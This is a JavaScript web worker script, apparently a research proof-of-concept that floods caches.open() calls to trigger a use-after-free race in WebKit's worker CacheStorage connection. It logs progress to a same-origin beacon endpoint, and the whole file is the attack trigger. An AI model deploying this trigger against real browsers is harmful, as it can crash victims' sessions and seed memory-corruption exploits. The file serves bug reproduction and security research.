// Worker-side CacheStorage storm. Every caches.open() reaches
// createMainThreadConnection(*this) -> workerThread->workerLoaderProxy()
// (shipped WorkerCacheStorageConnection.cpp), which is the dangling reference
// when the main thread has already destroyed the WorkerMessagingProxy.
function wb(tag) {
  try { fetch('/beacon/' + encodeURIComponent(tag) + '?t=' + Date.now(), { mode: 'no-cors' }).catch(function () {}); } catch (e) {}
}
wb('WK-STORM-ALIVE caches=' + (typeof caches));
var i = 0, running = false;
onmessage = function (e) {
  var n = (e.data && e.data.n) || 400;
  if (running) return;
  running = true;
  wb('WK-STORM-START n=' + n);
  var MODE = (e.data && e.data.mode) || 'caches';
  function step() {
    if (i++ >= n) { wb('WK-STORM-DONE i=' + i); return; }
    if (MODE === 'fetch') {
      try { fetch('/corpus/ffset-config.json?t=' + i + '&r=' + Math.random(), { mode: 'no-cors' }).catch(function () {}); } catch (err) {}
      if (i < 3) wb('WK-FETCH-STEP i=' + i);
      setTimeout(step, 0);
      return;
    }
    try {
      if (i < 3) wb('WK-STEP i=' + i + ' open=' + (typeof (caches && caches.open)));
      if (typeof caches !== 'undefined' && caches.open) {
        caches.open('t' + (i & 7)).then(function (db) {
          if (i < 3) wb('WK-OPEN-OK i=' + i + ' db=' + (db && db.name));
          try { if (db && db.close) db.close(); } catch (err) {}
        }, function (err) {
          if (i < 3) wb('WK-OPEN-REJ i=' + i + ' e=' + (err && err.name) + ' m=' + (err && err.message));
        });
      }
    } catch (err) {
      if (i < 4) wb('WK-OPEN-THROW i=' + i + ' e=' + (err && err.name) + ' m=' + (err && err.message));
    }
    setTimeout(step, 0);
  }
  step();
};
